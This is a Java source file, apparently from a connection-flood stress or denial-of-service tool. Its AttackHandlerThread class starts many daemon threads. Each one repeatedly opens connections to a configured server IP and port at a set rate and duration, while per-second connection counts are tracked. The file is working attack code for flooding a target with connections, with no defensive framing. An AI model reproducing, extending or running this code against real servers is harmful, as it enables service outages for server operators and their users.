package dev.lastknell.core.manager.attack.handler;

import dev.lastknell.core.config.AttackConfig;
import dev.lastknell.core.manager.ConnectionsInfo;
import dev.lastknell.core.manager.attack.AttackManager;
import dev.lastknell.core.methods.iAttackMethod;

import java.net.InetSocketAddress;

public class AttackHandlerThread implements Runnable {
    private final AttackConfig config;
    private final ConnectionsInfo info;
    private final iAttackMethod method;
    private final boolean shouldStop = false;

    public AttackHandlerThread(AttackConfig config, ConnectionsInfo info, iAttackMethod method) {
        this.config = config;
        this.method = method;

        final InetSocketAddress addr = new InetSocketAddress(config.srvIp, config.port);
        for (int i = 0; i < config.loopThreads; i++) {
            Thread t = new Thread(new LoopThread(addr));
            t.setDaemon(true);
            t.setName("LoopThread");
            t.setPriority(10);
            t.start();
        }
        this.info = info;
    }

    @Override
    public void run() {
        while (config.duration != info.secondsElapsed) {
            try {
                Thread.sleep(1000);
            } catch (InterruptedException ignored) {
            }
            info.secondsElapsed++;
            info.successfulCPS = 0;
            info.openedCPS = 0;
        }
        AttackManager.methods.remove(method);
    }

    private class LoopThread implements Runnable {
        private final InetSocketAddress addr;

        private LoopThread(InetSocketAddress addr) {
            this.addr = addr;
        }

        @Override
        public void run() {
            while (!shouldStop) {
                for (int j = 0; j < config.connectionsPerDelay; j++) {
                    config.bootstraps.forEach(bootstrap -> {
                        bootstrap.connect(addr);
                    });
                }
                try {
                    Thread.sleep(config.delay);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }
        }
    }
}
